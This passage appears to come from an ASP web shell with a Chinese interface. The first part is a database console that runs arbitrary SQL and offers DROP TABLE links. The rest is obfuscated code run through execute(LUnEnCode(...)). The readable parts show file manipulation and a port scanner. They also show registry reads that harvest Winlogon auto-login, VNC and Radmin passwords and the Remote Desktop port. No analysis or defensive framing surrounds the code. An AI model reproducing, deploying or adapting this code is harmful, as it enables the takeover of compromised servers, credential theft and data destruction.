  SI=SI&"<td><input name='SqlStr' style='width:470' value="""&SqlStr&"""></td>"
  SI=SI&"<td align='center'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  RRS SI:SI=""
  If Len(DbStr)>40 Then
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  SI=SI&"<table><tr height='25' Bgcolor='#CCCCCC'><td>表<br>名</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      SI=SI&"<td align=center><a href=""javascript:if(confirm('确定删除么？'))FullSqlStr('DROP TABLE ["&TName&"]',1)"">[ del ]</a><br>"
      SI=SI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  SI=SI&"</tr></table>"
  RRS SI:SI=""
If Len(SqlStr)>10 Then
  If LCase(Left(SqlStr,6))="select" then
    SI=SI&"执行语句："&SqlStr
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    SI=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      SI=SI&"<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    SI=SI&"</tr>"
    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  SI=SI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    SI=SI&"<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  SI=SI&"</tr>"
      Rs.MoveNext
    Loop
	RRS SI:SI=""
	SqlStr=HtmlEnCode(SqlStr)
    SI=SI&"<tr><td colspan="&FN+1&" align=center>记录数："&RC&"&nbsp;页码："&Page&"/"&PN
    If PN>1 Then
      SI=SI&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>首页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>上一页</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        SI=SI&i&"&nbsp;"
        Else
        SI=SI&"<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
        End If
      Next
	  SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>下一页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>尾页</a>"
    End If
    SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	RRS SI:SI=""
  Else	   
    Conn.Execute(SqlStr)
    SI=SI&"SQL语句："&SqlStr
  End If
  RRS SI:SI=""
End If
  Conn.Close
  Set Conn=Nothing
  End If:End Function
Dim T1

execute(LUnEnCode("xxfqH%isJ?stnyhszK%isJ?kN%isJ	eNX%XWW%%	eqwZphfG+NXBNX%%%%%%e'Cwjysjh4A！功成建新'+myfU+'录目CwgACwgACwgACwjysjhA'BNX%%%%%%emyfU%wjiqtKjyfjwH3KH%%	esjmY%''CAmyfU%isf%.myfU-xyxn}JwjiqtK3KH%ytS%kN?.myfU-wjiqtK|jS%stnyhszK?stnyhszK%isJ?kN%isJ	eNX%XWW%%	eqwZphfG+NXBNX%%%%%%e'Cwjysjh4A！功成动移'+.5-myfU+'录目CwgACwgACwgACwjysjhA'BNX%%%%%%e.6-myfU1.5-myfU%wjiqtKj{tR3KH%%	esjmY%''CA.6-myfU%isf%..5-myfU-xyxn}JwjiqtK3KH%kN%%%%e.'""""""""'1myfU-ynquX%B%myfU?.myfU-wjiqtKj{tR%stnyhszK?stnyhszK%isJ?kN%isJ	eNX%XWW%%	eqwZphfG+NXBNX%%%%%%e'Cwjysjh4A！功成制复'+.5-myfU+'录目CwgACwgACwgACwjysjhA'BNX%%%%%%e.6-myfU1.5-myfU%wjiqtK~utH3KH%%	esjmY%''CA.6-myfU%isf%..5-myfU-xyxn}JwjiqtK3KH%kN%%%%e.'""""""""'1myfU-ynquX%B%myfU?.myfU-wjiqtK~utH%stnyhszK?stnyhszK%isJ?kN%isJ	eNX%XWW%%	eqwZphfG+NXBNX%%%%%%e'Cwjysjh4A！功成除删'+myfU+'录目CwgACwgACwgACwjysjhA'BNX%%%%%%emyfU%wjiqtKjyjqjI3KH%%	esjmY%.myfU-xyxn}JwjiqtK3KH%kN?.myfU-wjiqtKqjI%stnyhszK?stnyhszK%isJ?ekN%isJ	e%NX%XWW%%	eqwZphfG+NXBNX%%%%%%e'Cwjysjh4A！功成动移'+.5-myfU+'件文CwgACwgACwgACwjysjhA'BNX%%%%%%e.6-myfU1.5-myfU%jqnKj{tR3KH%%	esjmY%''CA.6-myfU%isf%..5-myfU-xyxn}JjqnK3KH%kN%%%%e.'""""""""'1myfU-ynquX%B%myfU?.myfU-jqnKj{tR%stnyhszK?stnyhszK%isJ?kN%isJ	e%NX%XWW%%	eqwZphfG+NXBNX%%%%%%e'Cwjysjh4A！功成制复'+.5-myfU+'件文CwgACwgACwgACwjysjhA'BNX%%%%%%e.6-myfU1.5-myfU%jqnK~utH3KH%%	esjmY%''CA.6-myfU%isf%..5-myfU-xyxn}JjqnK3KH%kN%%%%e.'""""""""'1myfU-ynquX%B%myfU?.myfU-jqnK~utH%stnyhszK?stnyhszK%isJ?NX%XWWe'Crwtk4AC,存保,Bjzqf{%,ynrgzx,Bju~y%,ynrgzx,Bjrfs%yzusnA@uxgs+@uxgs+@uxgs+C,置重,Bjzqf{%,yjxjw,Bju~y%,yjxjw,Bjrfs%yzusnA@uxgs+@uxgs+@uxgs+C,@.-phfg3~wtyxnm,Bphnqhst%,回返,Bjzqf{%,styyzg,Bju~y%,phfgtl,Bjrfs%yzusnACwmA'+NXBNXe'CwgACfjwfy}jy4A'+y}Y+'C,5:9?ymlnjm@*556?myin|,Bjq~yx%,ysjystH,Bjrfs%fjwfy}jyA'+NXBNXe'CwgAC,*556?myin|,Bjq~yx%,'+myfU+',Bjzqf{%,jrfSK,Bjrfs%yzusnA'+NXBNXe'C,sjiinm,Bju~Y%,jqnKyniJ,Bjzqf{%,stnyhF,Bjrfs%yzusnA'+NXBNXe'C,rwtKyniJ,Bjrfs%,yxtu,Bitmyjr%,yxtUB7stnyhFD'+QWZ+',Bstnyhf%rwtKA'+NXBNXekN%isJe'件文建新'By}Y?'uxf3jz~zt~a'+.'myfUwjiqtK'-stnxxjXBmyfUejxqJelsnmytSBY%yjXejxtqh3Ye%.qqfifjw3Y-jithsJQRYMBy}Ye.jxqfK%16%1myfU-jqnky}jysjut3KHBY%yjXesjmY%''CAmyfU%kNekN%isJeisJ3jxstuxjWeNX%XWWeqwZphfG+NXBNXe'Cwjysjh4A！功成存保件文CwgACwgACwgACwjysjhA'BNXelsnmytsBY%yjXejxtqh3Ye.'ysjysth'-rwtk3yxjzvjW%jsnQjynw\3Ye.myfU-jqnKy}jYjyfjwH3KHBY%yjXesjmY%'yxtU'B.'7stnyhF'-yxjzvjW%kN?.myfU-jqnKyniJ%stnyhszK?stnyhszK%isJ?kN%isJeNX%XWWeqwZphfG+NXBNXe'Cwjysjh4A！功成除删%'+myfU+'%件文CwgACwgACwgACwjysjhA'BNXemyfU%jqnKjyjqjI3KHesjmY%.myfU-xyxn}JjqnK3KH%kN?.myfU-jqnKqjI%stnyhszK?stnyhszk%isJ?lsnmytSBIQTK%yjX%%ey}jS%%e''BNX?NX%XWW	e'Cjqgfy4ACwy4A'+NXBNX%%%%e'Ciy4A'+ijnknitRyxfQjyfI3Q+'C,5;6,Bmyin|%iyA'+NXBNX%%%%e'Ciy4A'+ju~Y3Q+'C''wjysjh''Bslnqf%,557,Bmyin|%iyA'+NXBNX	e'Ciy4AP'+.97564j nx3Q-lsqh+'C''wjysjh''Bslnqf%,5:,Bmyin|%iyA'+NXBNX%%%%e	'Ciy4ACf4Aj{trC,动移,Bjqyny%,rf,Bxxfqh%,.''jqnKj{tR''1'''+.jrfS3Q+'a'+myfU-myfUjW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fAC''wjysjh''Bslnqf%,59,Bmyin|%iyA'+NXBNX	e'Ciy4ACf4A~uthC,制复,Bjqyny%,rf,Bxxfqh%,.''jqnK~utH''1'''+.jrfS3Q+'a'+myfU-myfUjW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fAC''wjysjh''Bslnqf%,59,Bmyin|%iyA'+NXBNX	e'Ciy4ACf4AqjiC,除删,Bjqyny%,rf,Bxxfqh%,.-ptxj~%swzyjw,Bphnqhst%%,.''jqnKqjI''1'''+.jrfS3Q+'a'+myfU-myfUjW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fAC''wjysjh''Bslnqf%,59,Bmyin|%iyA'+NXBNX	e'Ciy4ACf4AynijC,辑编,Bjqyny%,rf,Bxxfqh%,.''jqnKyniJ''1'''+.jrfS3Q+'a'+myfU-myfUjW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fAC''wjysjh''Bslnqf%,59,Bmyin|%iyA'+NXBNX%%%%e'Ciy4ACf4A'+jrfS3Q+'Cystk4A7C,9,Bj nx%,xlsnilsn|,Bjhfk%ystkAC,载下,Bjqyny%,@.''jqnKs|tI''1'''+.jrfS3Q+'a'+myfU-myfUjW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fAC,58,Bymlnjm%iyA'+NXBNX	e'C,(?wtqth2uztwlsztg,Bjq~yx%wyA'+NXBNX%%%%e'C,5,Blsniifuqqjh%,5,Blsnhfuxqqjh%,5,Bwjiwtg%,*556,Bmyin|%jqgfyA'BNX%%%%exjqnk3iqtK%sn%Q%mhfJ%wtK%%e''BNX%?%'C4%''(''Bwtqth%6Bj nx%jifmxts%wmA'+%NX%XWW	e'Cjqgfy4ACwy4ACiy4AC7Bymlnjm%iyACwyACwy4A'+NXBNX%%%%ey}jS%%e'CwyACwy4A'+NXBNX%sjmy%5%B%8%itr%n%kN%%%%e60nBn	e'Ciy4ACf4As|tIC,载下,Bjqyny%,rf,Bxxfqh%,.-ptxj~%swzyjw,Bphnqhst%%,.''jqnKs|tI''1'''+.jrfS3K+'a'+myfU-myfUjW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fA%'+NXBNX	e'Cf4Aj{tRC,动移,Bjqyny%,rf,Bxxfqh%,.-ptxj~%swzyjw,Bphnqhst%%,.''wjiqtKj{tR''1'''+.jrfS3K+'a'+myfU-myfUjW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fA%'+NXBNX	e'Cf4AqjIC,除删,Bjqyny%,rf,Bxxfqh%,.-ptxj~%swzyjw,Bphnqhst%%,.''wjiqtKqjI''1'''+.'aa'1'a'1jrfS3K+'a'+myfU-jhfqujW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fA%%'+NXBNX%%%%e'Cf4A~utHC,制复,Bjqyny%,rf,Bxxfqh%,.-ptxj~%swzyjw,Bphnqhst%%,.''wjiqtK~utH''1'''+.jrfS3K+'a'+myfU-myfUjW+'''-rwtKqqzK?yunwhxf{fo,Bkjwm%fAd%'+NXBNX	e%'Cf4A'+jrfS3K+'Cystk4A5C,;,Bj nx%,xlsnilsn|,Bjhfk%ystkAC''开打''Bjqyny%,.'''+.jrfS3K+'a'+myfU-myfUjW+'''-wjiqtK|tmX?yunwhxf{fo,Bkjwm%fA'+NXBNX%%%%e'C56Bymlnjm%iyA'+NXBNX%%%%exwjiqtkgzx3IQTK%sn%K%mhfJ%wtK%%e'CwyAC,5,Blsniifuqqjh%,5,Blsnhfuxqqjh%,5,Bwjiwtg%,*556,Bmyin|%jqgfyA'BNX%%%%e5Bn%%e.myfU-wjiqtKyjL3KHBIQTK%yjX?.myfU-jqnK6|tmX%stnyhszK?stnyhszK%isJ?y}jS%%%%e%'CwgACf4A.?'+wjyyjQj{nwI3I+'-%盘磁地本C,.''aa?'+wjyyjQj{nwI3I+'''-wjiqtK|tmX?yunwhxf{fo,Bkjwm%fA@uxgs+@uxgs+@uxgs+'XWW%%%%%%exj{nwI3KH%sn%I%mhfJ%wtK?.-wj{nwI|tmX%stnyhszKegzX%isJelsnmytSBKH%yjX%%%%ejyfsnrwjYdxxfqH%gzX%jyf{nwU%%egzX%isJ%%e..515-YgT-yhjogTjyfjwHBKH%YJX%%%%ej nqfnynsNdxxfqH%gzX%jyf{nwU%%eKH%rnI%%eKGQ%xxfqHexxfqH%isJestnyhszk%isj%%%ejxqfkBxFj{fX%%%%%elsnmytsB8Y%yjx%%%%%ejxtqH38Y%%%%%e71K%jqnKtYj{fX38Y%%%%%ej nXjqnK18Y%ty~uth36Y%%%%%eywfyXjqnKBstnynxtu36Y%%%%%esjuT38Y%?%6Bju~Y38Y%?%8BjitR38Y%%%%%e..51;-YgT-yhjogTjyfjwHB8Y%yjx%%estnyhszk%yn}j%sjmy%5BywfyXjqnK%wt%''B.K-rnwy%kn%%ejzwyBxFj{fX%%e8Y%rni%%e.K-xFj{fX%stnyhszk%hnqgzU%%egzX%isJ%%e5%BywfyXjqnK%%e5%B%j nXjqnK%%ej nqfnynsNdxxfqH%gzX%jyf{nwU%%eywfyXjqnK1j nXjqnK%rnieKNK%xxfqHexxfqH%isJegzX%isJ%%ekn%isj%%%%elsnmytsB%6Y%yjx?jxtqH36Y%%%%%%elsnmytsB7I%yjx?lsnmytsB6I%yjx%%%%%%eqqFj{trjW37I?qqFj{trjW36I%%%%%%esjmy%5Cxjy~GqfytY3yxjzvjW%kn%%%%ejyfsnrwjYdxxfqH%gzX%jyf{nwU%%egzX%isJ%%elsnmytsB%7Y%yjx%%%%e''BfIY%%%%eisj|%%%%e60sjQY0ywfyXIBywfyXI%%%%%%ekn%isj%%%%%%ekn%isj%%%%%%%%e[KX1jrfSuZ%iiF36I%%%%%%%%%%ejxqj%%%%%%%%e[KX+'%1'+.jrfSuZ-6IB.jrfSuZ-6I%%%%%%%%%%esjmy%.jrfSuZ-xyxn}J36I%kn%%%%%%%%ejxtqH37Y%%%%%%%%ey}jYifjW37Y%B%[KX%%%%%%%%e'7687gl'B%yjxwfmH37Y%%%%%%%%e7%B%ju~Y37Y%?%5%B%stnynxtU37Y%%%%%%%%e82isJNI2ywfyXI17Y%tY~utH36Y%?%isJNI%B%stnynxtU36Y%%%%%%%%esjuT37Y%?%8B%jitR37Y%?%6B%ju~Y37Y%%%%%%%%ejxqj%%%%%%ekn%isj%%%%%%%%eQKY1jrfSuZ%iif37I%%%%%%%%%%esjmy%.jrfSuZ-xyxn}J37I%yts%kn%%%%%%%%e82%isJNI2%ywfyXI%B%j nXjqnK3QKY%%%%%%%%eisJNIB%ywfyXjqnK3QKY%%%%%%%%e.wHg{1sNY1ywfyXK-wyXsN%B%isJK%%%%%%%%e960.61'%?ju~Y2ysjystH'1sNY1isJK-wyXsN%B%ywfyXK%%%%%%%%e.61''''1sNY1ywfyXK-wyXsN%B%isJK%%%%%%%%e560.61'''Bjrfsjqnk'1sNY1isJK-wyXsN%B%ywfyXK%%%%%%%%eKNK%|jsBQKY%yjx%%%%%%%%esjmy%5%C%.61'''Bjrfsjqnk'1sNY1:9-%wyXsN%kn%%%%%%e..ywfyXK2isJK1ywfyXK1sNY-%inR-jxfhq%B%jrfSuZ%%%%%%e.61''''1sNY1ywfyXK-wyXsN%B%isJK%%%%%%e;0.61'''Bjrfs'1sNY177-wyXsN%B%ywfyXK%%%%%%e.yXY1fIY1isJNI-GwyXsN%B%ywfyXI%%%%%%ejxtqH37Y%?%y}jYifjW37Y%B%sNY%%%%%%e'7687gl'B%yjxwfmH37Y%?%7%B%ju~Y37Y%?%5%B%stnynxtU37Y%%%%%%eywfyXI2isJNI17Y%tY~utH36Y%%%%%%eywfyXI%B%stnynxtU36Y%%%%%%esjuT37Y%?%8B%jitR37Y%?%6%B%ju~Y37Y%%%%%%e80.kqwHg{%+%kqwHg{1fIY1ywfyXI-GwyXsN%B%isJNI%%%%%%eisJI%A%.56%0%ywfyXI-%jqnm|%%%%e60sjQY0ywfyXIBywfyXI%%%%e.yXY-%GsjQ%B%sjQY%%%%e.62.kqwHg{1fIY1ywfyXI-GwyXsN%161fIY-GinR%B%yXY%%%%e..51;-YgT-yhjogTjyfjwH%B%7Y%yjx%%%%e.56-Gwmh%+%.86-Gwmh%B%kqwHg{	e..519-YgT-yhjogTjyfjwHB7I%yjx%%%%e.fIY-GsjQ%B%isJI%%%%e6%B%ywfyXI%?%ifjW36YB%fIY%?%5BstnynxtU36Y%%%%e.xjy~GqfytY3yxjzvjW-ifjW~wfsnG3yxjzvjW%%jynw\36Y%%%%esjuT36Y%?%8B%jitR36Y%?%6%B%ju~Y36Y	e..51;-YgT-yhjogTjyfjwH%B%6Y%yjx%%%%egzX%yn}J%sjmy%6Axjy~GqfytY3yxjzvjW%kn	e..519-YgT-yhjogTjyfjwHB6I%yjx%%%%ejrfSuZ1isJI1ywfyXI1isJK1ywfyXK1[KX1QKY1sjQY17Y1isJNI1sNY1kqwHg{1yXY1fIY%rnI%%ej nqfnynsNdxxfqH%gzX%jyf{nwU%%estnyhszK%isJ%%ekn%isj?KNK%|jsBFZ%yjx?jxqj?.K-7IBFZ%yjx?sjmy%.K-xyxn}j37I%kN%%%%e.K-jxfhqBK%%%%e.K-FZ%stnyhszK%hnqgzU%%estnyhszK%isJ%%ekn%isj?''BrwtK?jxqj?.K-6IBrwtK?sjmy%.K-xyxn}j36I%kN%%%%e.K-jxfhqBK%%%%e.K-rwtK%stnyhszK%hnqgzU%%e7I16I%rnI%%eHUZ%xxfqH")):execute(LUnEnCode("egzx%isj?KN%ISJe'x%'+jrnyjmy+'%sn%xxjhtwUCwmA'XWWe..6wjrny27wjrny-ysn-wyxhBjrnyjmyewjrny%B%7wjrnyey}jSekN%isJey}jSey}jSekN%isJekN%isJe.'CwgAwjgrzs%yts%xn%'%+%.n-ury-XWWejxqJekN%isJe.'CwgAwjgrzs%yts%xn%'%+%Sisj%+%'%wt%'%+%Sywfyx-XWWejxqJey}jSe.o1}}}%+%ywfyXun-sfhX%qqfHeSisj%tY%Sywfyx%B%o%wtKesjmY%.Sisj-hnwjrzsxN%isf%.Sywfyx-hnwjrzsxN%kNe.%}pjjx%2%..n-ury-sjQ%1.n-ury-ymlnW%B%Sisje.%6%2%}pjjx%1.n-ury-ykjQ%B%SywfyxesjmY%5%C%}pjjx%kNe.'2'%1.n-ury-wyXsN%B%}pjjxejxqJe..n-ury%1}}}%+%ywfyXun-sfhX%qqfHe%sjmY%..n-ury-hnwjrzsxN%kNe.ury-isztgZ%tY%5%B%n%wtKe..'2'1.zm-un-wyXsN2..zm-un-sjQ160.'2'1.zm-un-wyXsN1.zm-un-inR%ty%.6160.'3'1.zm-un-{jWwyXsN1.zm-un-inR%B%}}}%wtKe..'3'1.zm-un-{jWwyXsN161.zm-un-inR%B%ywfyXunejxqJey}jSekN%isJekN%isJe.'CwgAwjgrzs%yts%xn%'%+%.n-ury-XWWejxqJekN%isJe.'CwgAwjgrzs%yts%xn%'%+%Sisj%+%'%wt%'%+%Sywfyx-XWWejxqJey}jSe.o%1.zm-un-sfhX%qqfHeSisj%tY%Sywfyx%B%o%wtKesjmY%.Sisj-hnwjrzsxN%isf%.Sywfyx-hnwjrzsxN%kNe.%}pjjx%2%..n-ury-sjQ%1.n-ury-ymlnW%B%Sisje.%6%2%}pjjx%1.n-ury-ykjQ%B%SywfyxesjmY%5%C%}pjjx%kNe.'2'%1.n-ury-wyXsN%B%}pjjxejxqJe..n-ury%1.zm-un-sfhX%qqfHe%sjmY%..n-ury-hnwjrzsxN%kNe.ury-isztgZ%tY%5%B%n%wtKesjmY%5%B%.'2'1.zm-un-wyXsN%kNe.un-isztgZ%ty%5%B%zm%wtKe.'1'1.'un'-rwtK3yxjzvjw-ynquX%B%une.'1'1.'ywtu'-rwtK3yxjzvjw-ynquX%B%urye.'CwmACwgACg4A?告报描扫CgA'-XWWewjrny%B%6wjrnyesjmY%''%CA%.'sfhx'-rwtK3yxjzvjw%kNe'Crwtk4ACu4A'XWWe'C,666,Bjzqf{%,sfhx,Bin%,sjiinm,Bju~y%,sfhx,Bjrfs%yzusnA'XWWe'C,%sfhx%,Bjzqf{%,rtyyzg,Bxxfqh%,ynrgzx,Bju~y%,ynrgzx,Bjrfs%yzusnA'XWWe'CwgACwgA'XWWe'C,'+yxnQywtU+',Bjzqf{%,5;,Bj nx%,}tGy}jY,Bxxfqh%,y}jy,Bju~y%,ywtu,Bjrfs%yzusnA'XWWe'?yxnQ%ywtUCwgA'XWWe'C,5;,Bj nx%,'+UN+',Bjzqf{%,un,Bin%,}tGy}jY,Bxxfqh%,y}jy,Bju~y%,un,Bjrfs%yzusnA%'XWWe'@uxgs+?UN%sfhXCuA'XWWe'C,@jzwyBijqgfxni3ynrgzx36rwtk,BynrgzXst%,,Bstnyhf%,yxtu,Bitmyjr%,6rwtk,Bjrfs%rwtkA'XWWe'Cu4A.IRH用使荐推人个1慢较比度速1口端个多描扫果如-器描扫口端CuA'XWWekn%isje.'un'-rwtK3yxjzvjwBUNejxqje'635353<76'BUNesjmy%''B.'un'-rwtK3yxjzvjw%knekn%isje.'ywtu'-rwtK3yxjzvjwByxnQywtUejxqje'68;:1=:>891>=88188961:991>861:86156615=1:7187167'ByxnQywtUesjmy%''B.'ywtu'-rwtK3yxjzvjw%kne555;<<<%B%yztjrnYyunwhX3wj{wjX?.-ywtUsfhX%gzx?gzx%isj?kn%isjekN%isJe~fwwFjmy%+%'CnqA'XwWejxqJ%ey}jSe.n-~fwwFjmy%+%'CnqA'XwWe.~fwwFjmy-isztGZ%tY%5Bn%wtKesjmY%.~fwwFjmy-~fwwFxN%kNe.myfUjmy-ifjWljW3]x|B~fwwFjmye.'myfUjmy'-yxjzvjWBmyfUjmye.'qqjmX3yunwhX\'-yhjogTjyfjwH3wj{wjX%B%]x|%yjXey}jS%jrzxjW%wtwwJ%sTesjmy%''CA.'myfUjmy'-yxjzvjW%kne'C4wmACrwtk4A'XwWe'Csfux4A'XwWe'C4wmAC,@jsts?~fquxni,Bjq~yx%tksNynijljwBin%sfuxA'XwWe'CwgAC4wgA#.换替的面上把-列序的卡网前当!%isnGajlfpsnQaunuhYaxjhn{wjXa655yjXqtwystHaRJYX^XaRQPM'XwWe'Cu4ACuACwgAC4wgA#卡网动活块几共!%ysztHarzsJaunuhYaxjhn{wjXa655yjXqtwystHaRJYX^XaRQPM'XwWe'Cu4ACuAC4wgA22222222222222222222WJ[T22222222222'XwWe'CwgAC4wgA#口端UIZ的许允!%xywtUij|tqqFUIZa#J7GJ::HI=98628KKF2H5G92>>J=2=76:;9F=!axjhfkwjysNaxwjyjrfwfUaunuhYaxjhn{wjXa655yjXqtwystHaRJYX^XaRQPM'XwWe'CwgAC4wgA#口端UN4UHY的许允!%xywtUij|tqqFUHYa#J7GJ::HI=98628KKF2H5G92>>J=2=76:;9F=!axjhfkwjysNaxwjyjrfwfUaunuhYaxjhn{wjXa655yjXqtwystHaRJYX^XaRQPM'XwWe'CwgAC4wgA#XSI首!%wj{wjXjrfSa#J7GJ::HI=98628KKF2H5G92>>J=2=76:;9F=!axjhfkwjysNaxwjyjrfwfUaunuhYaxjhn{wjXayjXqtwystHysjwwzHaRJYX^XaRQPM'XwWe'CwgAC4wgA#关网认默!%_XdNYZRdLJW1~f|jyfLyqzfkjIa#J7GJ::HI=98628KKF2H5G92>>J=2=76:;9F=!axjhfkwjysNaxwjyjrfwfUaunuhYaxjhn{wjXayjXqtwystHysjwwzHaRJYX^XaRQPM'XwWe'Cu4ACuAC4wgA222222222确准否是道知不1卡网的定绑看要乎似下以2222222'XwWe'CwgAC4wgA#由路UN许允!%61IWT\IdLJW1wjyztWjqgfsJUNaxwjyjrfwfUaunuhYaxjhn{wjXa655yjXqtwystHaRJYX^XaRQPM'XwWe'CwgAC4wgA#.器配试有所-选筛UN4UHY用启!%61IWT\IdLJW1xwjyqnK~ynwzhjXjqgfsJaxwjyjrfwfUaunuhYaxjhn{wjXayjXqtwystHysjwwzhaRJYX^XaRQPM'XwWe'CwgAC4wgA#享共络网闭关!%51_XdLJW1xj{nwIyjSijwfmXjqgfsJaxwjyjrfwfUawj{wjXsfrsfQaxjhn{wjXayjXqtwystHysjwwzHaRJYX^XaRQPM'XwWe'CwgAC4wgA#享共认默止禁!%51IWT\IdLJW1wj{wjXjwfmXtyzFaxwjyjrfwfUawj{wjXsfrsfQaxjhn{wjXayjXqtwystHysjwwzHaRJYX^XaRQPM'XwWe'CwgAC4wgA#享共)HUN机本接连法无户用名匿B71表列户用机本举列法无户用名匿B61省缺B5!%51IWT\IdLJW1xztr~stsfyhnwyxjwafxQaqtwystHayjXqtwystHysjwwzHaRJYX^XaRQPM'XwWe'CwgAC4wgA#户用录登次上示显不!%61_XdLJW1jrfSwjxZyxfQ~fquxnI2ystIastltqsn\astnxwj[ysjwwzHax|tisn\ayktxtwhnRajwf|yktXaRQPM'XwWe'CwgACwgACwgA%%C,%码密snrifW取读%,Bjzqf{%ynrgzxBju~y%yzusnA%'XwWe'CsjiinmBju~y%5=Bj nx%,snriFWaRJYX^XaJSNMHFRdQFHTQd^JPM,Bjzqf{%snrifwBjrfs%yzusnA'XwWe'CsnrifwBjrfs%ljWifjwBjzqf{%sjiinmBju~y%yzusnA'XwWe'%%C,%码密HS[取读%,Bjzqf{%ynrgzxBju~y%yzusnA%'XwWe'CsjiinmBju~y%5=Bj nx%,iwt|xxfUa8HS[sn\aQWTajwf|yktXaZHPM,Bjzqf{%hs{Bjrfs%yzusnA'XwWe'Chs{Bjrfs%hs{Bjzqf{%sjiinmBju~y%yzusnA'XwWe'CwgACwgAC,%取读%,Bjzqf{%ynrgzxBju~y%yzusnA%'XwWe'C5=Bj nx%,jrfSwjyzurtHajrfSwjyzurtHajrfSwjyzurtHaqtwystHayjXqtwystHysjwwzHaRJYX^XaRQPM,Bjzqf{%myfUjmyBjrfs%yzusnA'XwWe'CyhFjmyBjrfs%ljWifjwBjzqf{%sjiinmBju~y%yzusnA'XwWe'CyxtuBitmyjr%rwtkA'XwWe'C4wmA?取读值键表册注'XwW?.-LJWifjW%gzxegzX%isJe?'Cqt4A'%XWWekN%isJe'CwgA'%+%iwt|xxfUsnltQtyzf%+%'%?码密户帐的录登动自'%XWWekN%isJe'jxqfK'%XWWewfjqH3wwJesjmY%wwJ%kNe.~jPxxfUsnltQtyzf%+%myfUsnltQtyzf-ifjWljW3]x|%B%iwt|xxfUsnltQtyzfe'CwgA'%+%jrfswjxZsnltQtyzf%+%'%?户帐统系的录登动自'%XWWe.~jPwjxZsnltQtyzf%+%myfUsnltQtyzf-ifjWljW3]x|%B%jrfswjxZsnltQtyzfejxqJe'C4wgA启开未能功录登动自统系'%XWWesjmY%5%B%jqgfsJsnltQtyzFxn%kNe.~jPjqgfsJsnltQtyzf%+%myfUsnltQtyzf-ifjWljW3]x|%B%jqgfsJsnltQtyzFxne'iwt|xxfUyqzfkjI'%B%~jPxxfUsnltQtyzfe'jrfSwjxZyqzfkjI'%B%~jPwjxZsnltQtyzfe'stltQsnriFtyzF'%B%~jPjqgfsJsnltQtyzfe'astltqsn\astnxwj[ysjwwzHaYS%x|tisn\ayktxtwhnRaJWF\YKTXaJSNMHFRdQFHTQd^JPM'%B%myfUsnltQtyzfekN%isJe'C4wgA'%+%ywtUrwjy%+%'%?口端务服端终前当'%XWWejxqJ%e'C4wgA3制限到受经已否是限权查检请%1口端务服端终到得法无'XWWe%sjmY%5%CA%wjgrzS3wwJ%wT%''%B%ywtUrwjy%kNe'CqtAC4wmA录登动自及口端务服端终'%XWWe.~jPywtUqfsnrwjy%+%myfUywtUqfsnrwjy-ifjWljW3]x|%B%ywtUrwjye'wjgrzSywtU'%B%~jPywtUqfsnrwjye'auhY2UIWaxstnyfyXsn\awj{wjX%qfsnrwjYaqtwystHayjXqtwystHysjwwzHaRJYX^XaRQPM'%B%myfUywtUqfsnrwjyeiwt|xxfUsnltQtyzf%1jrfswjxZsnltQtyzf%1~jPjqgfsJsnltQtyzf%1jqgfsJsnltQtyzFxn%rnIe~jPxxfUsnltQtyzf%1~jPwjxZsnltQtyzf%1myfUsnltQtyzf%rnIeywtUrwjy%1~jPywtUqfsnrwjy%1myfUywtUqfsnrwjy%rnIe.'qqjmX3yunwhX\'-yhjogTjyfjwH3wj{wjX%B%]x|%yjXe'222222222222222222222222222222222222222222222222222222'%jynw\3jxstuxjWe'CwgA'+ywtU\FU+'?为口端jwjm|~sFhUCnqA'%jynw\3jxstuxjWe'jwjm|~sFhu装安否是机主认确请3取获法无'BywtU\FU%sjmy%''BywtU\FU%kNe.~jPjwjm|~sFhu-ifjWljW3mx\BywtU\FUe'ywtUfyfIUNUHYarjyx~Xastnxwj[ysjwwzHajwjm|~sFhuahjysfr~XaJWF\YKTXaJSNMHFRdQFHTQd^JPM'B~jPjwjm|~sFhue'Cw